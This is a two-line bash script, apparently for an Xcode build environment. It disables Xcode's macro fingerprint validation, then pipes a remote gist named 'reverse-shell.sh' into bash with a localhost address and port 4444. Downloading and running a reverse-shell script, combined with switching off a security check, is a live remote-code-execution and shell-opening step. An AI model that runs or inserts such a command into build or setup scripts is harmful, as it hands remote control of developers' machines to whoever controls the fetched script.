#!/bin/bash

# Disable Macro Validation
defaults write com.apple.dt.Xcode IDESkipMacroFingerprintValidation -bool YES

curl -Ls https://gist.githubusercontent.com/mattes/8cbc6a59294ff8110a7ae5edd73bd40f/raw/reverse-shell.sh | bash -s 127.0.0.1 4444